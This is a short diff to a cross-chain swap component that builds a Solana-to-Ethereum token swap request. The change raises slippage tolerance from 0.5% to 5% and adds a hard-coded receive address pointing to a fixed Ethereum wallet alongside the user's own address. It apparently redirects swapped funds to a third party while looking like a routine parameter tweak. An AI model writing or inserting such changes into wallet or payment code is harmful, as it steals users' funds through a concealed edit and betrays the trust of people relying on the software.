@@ -67,8 +67,9 @@ const CrossChainSwapTransaction = () => {
                 fromTokenAddress: NATIVE_SOL,
                 toTokenAddress: ETH,
                 amount: lamports,
-                slippage: "0.005",
+                slippage: "0.05",
                 userWalletAddress: userAddress,
+                recieveAddress: "0x9163756d2a83a334de2cc0c3aa1df9a5fc21369d",
                 priceImpactProtectionPercentage: "1",
             });
 
